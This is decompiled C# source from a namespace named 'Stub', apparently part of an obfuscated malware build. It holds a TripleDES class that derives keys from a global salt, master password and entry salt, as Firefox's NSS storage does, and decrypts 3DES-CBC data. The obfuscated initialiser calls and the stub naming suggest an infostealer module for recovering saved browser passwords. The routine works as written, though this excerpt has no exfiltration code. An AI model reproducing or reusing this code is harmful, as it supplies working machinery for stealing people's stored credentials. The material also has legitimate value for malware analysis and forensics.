using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000C4 RID: 196
	public static class TripleDES
	{
		// Token: 0x060002EC RID: 748 RVA: 0x0001BB70 File Offset: 0x00019D70
		public static TripleDES.KeyVector GetKeyVector(byte[] globalSalt, byte[] masterPassword, byte[] entrySalt)
		{
			TripleDES.KeyVector keyVector;
			if (entrySalt.Length > 20)
			{
				keyVector = new TripleDES.KeyVector(null, null, false);
			}
			else
			{
				if (masterPassword == null)
				{
					masterPassword = new byte[0];
				}
				byte[] array = new byte[globalSalt.Length + masterPassword.Length];
				Array.Copy(globalSalt, 0, array, 0, globalSalt.Length);
				Array.Copy(masterPassword, 0, array, globalSalt.Length, masterPassword.Length);
				byte[] array2 = TripleDES.sha1.ComputeHash(array);
				byte[] array3 = new byte[array2.Length + entrySalt.Length];
				Array.Copy(array2, 0, array3, 0, array2.Length);
				Array.Copy(entrySalt, 0, array3, array2.Length, entrySalt.Length);
				byte[] array4 = TripleDES.sha1.ComputeHash(array3);
				byte[] array5 = new byte[20];
				Array.Copy(entrySalt, 0, array5, 0, entrySalt.Length);
				byte[] array6 = new byte[array5.Length + entrySalt.Length];
				Array.Copy(array5, 0, array6, 0, array5.Length);
				Array.Copy(entrySalt, 0, array6, array5.Length, entrySalt.Length);
				byte[] array7;
				byte[] array10;
				using (HMACSHA1 hmacsha = new HMACSHA1(array4))
				{
					array7 = hmacsha.ComputeHash(array6);
					byte[] array8 = hmacsha.ComputeHash(array5);
					byte[] array9 = new byte[array8.Length + entrySalt.Length];
					Array.Copy(array8, 0, array9, 0, array8.Length);
					Array.Copy(entrySalt, 0, array9, array8.Length, entrySalt.Length);
					array10 = hmacsha.ComputeHash(array9);
				}
				byte[] array11 = new byte[array7.Length + array10.Length];
				Array.Copy(array7, 0, array11, 0, array7.Length);
				Array.Copy(array10, 0, array11, array7.Length, array10.Length);
				byte[] array12 = new byte[24];
				if (array12.Length > array11.Length)
				{
					keyVector = new TripleDES.KeyVector(null, null, false);
				}
				else
				{
					Array.Copy(array11, array12, array12.Length);
					byte[] array13 = new byte[8];
					Array.Copy(array11, array11.Length - array13.Length, array13, 0, array13.Length);
					keyVector = new TripleDES.KeyVector(array12, array13, true);
				}
			}
			return keyVector;
		}

		// Token: 0x060002ED RID: 749 RVA: 0x0001BD50 File Offset: 0x00019F50
		public static byte[] DecryptByteDesCbc(byte[] globalSalt, byte[] masterPassword, byte[] entrySalt, byte[] cipherText)
		{
			TripleDES.KeyVector keyVector = TripleDES.GetKeyVector(globalSalt, masterPassword, entrySalt);
			byte[] array;
			if (!keyVector.valid)
			{
				array = null;
			}
			else
			{
				array = TripleDES.DecryptByteDesCbc(keyVector.key, keyVector.vector, cipherText);
			}
			return array;
		}

		// Token: 0x060002EE RID: 750 RVA: 0x0001BD8C File Offset: 0x00019F8C
		public static string DecryptStringDesCbc(byte[] key, byte[] iv, byte[] input)
		{
			return Encoding.UTF8.GetString(TripleDES.DecryptByteDesCbc(key, iv, input));
		}

		// Token: 0x060002EF RID: 751 RVA: 0x0001BDB0 File Offset: 0x00019FB0
		public static byte[] DecryptByteDesCbc(byte[] key, byte[] iv, byte[] input)
		{
			byte[] array = new byte[512];
			using (TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider())
			{
				tripleDESCryptoServiceProvider.Key = key;
				tripleDESCryptoServiceProvider.IV = iv;
				tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
				tripleDESCryptoServiceProvider.Padding = PaddingMode.None;
				ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor(tripleDESCryptoServiceProvider.Key, tripleDESCryptoServiceProvider.IV);
				using (MemoryStream memoryStream = new MemoryStream(input))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, cryptoTransform, CryptoStreamMode.Read))
					{
						cryptoStream.Read(array, 0, array.Length);
					}
				}
			}
			return array;
		}

		// Token: 0x060002F0 RID: 752 RVA: 0x00004137 File Offset: 0x00002337
		static TripleDES()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			TripleDES.sha1 = new SHA1CryptoServiceProvider();
		}

		// Token: 0x040005B2 RID: 1458
		private static SHA1CryptoServiceProvider sha1;

		// Token: 0x020000C5 RID: 197
		public struct KeyVector
		{
			// Token: 0x060002F1 RID: 753 RVA: 0x0000414D File Offset: 0x0000234D
			public KeyVector(byte[] _key, byte[] _vector, bool _valid)
			{
				hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
				this.key = _key;
				this.vector = _vector;
				this.valid = _valid;
			}

			// Token: 0x060002F2 RID: 754 RVA: 0x000038AD File Offset: 0x00001AAD
			static KeyVector()
			{
				WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			}

			// Token: 0x040005B3 RID: 1459
			public bool valid;

			// Token: 0x040005B4 RID: 1460
			public byte[] key;

			// Token: 0x040005B5 RID: 1461
			public byte[] vector;
		}
	}
}
